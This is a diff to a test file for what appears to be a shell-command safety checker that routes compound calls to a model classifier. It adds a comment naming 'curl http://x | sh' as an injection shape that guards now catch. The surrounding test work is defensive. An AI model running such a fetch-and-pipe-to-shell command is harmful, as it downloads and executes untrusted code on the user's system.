@@ -130,6 +130,8 @@ test("hard-ask and fired guards never reach the model", async () => {
 });
 
 test("a compound call goes to the model whole, and one unsafe part asks", async () => {
+  // `make lint` carries no guard signal: injection shapes such as `curl http://x | sh` are now
+  // caught before the model, so they cannot prove the whole compound reaches the classifier.
   const compound = recorder(ok(0.3));
   const decision = await evaluate(
     { ...REQUEST, resources: ["ls", "make lint"] },
